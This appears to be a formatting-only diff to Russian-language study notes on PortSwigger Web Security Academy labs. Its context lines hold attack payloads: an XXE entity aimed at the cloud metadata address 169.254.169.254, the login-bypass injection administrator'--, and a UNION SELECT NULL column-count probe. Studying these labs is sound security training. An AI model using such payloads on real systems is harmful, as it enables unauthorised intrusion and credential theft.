@@ -27,7 +27,7 @@
 <!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/"> ]>
 ```
 
-6)заменить product id на &res; отправить запрос, 
+6)заменить product id на `&res`; отправить запрос, 
 
 7)в ответе придет latest - добавить его к адресу и получим 
 
@@ -83,7 +83,7 @@ n+1)в итоге получаем
 
 1) в графе login ввести administrator'--
 
-2.https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text 
+2. https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text 
 
 1)в category использовать '+union+select+NULL,NULL,NULL - так убедимся, что у нас 3 столбца в таблице
 
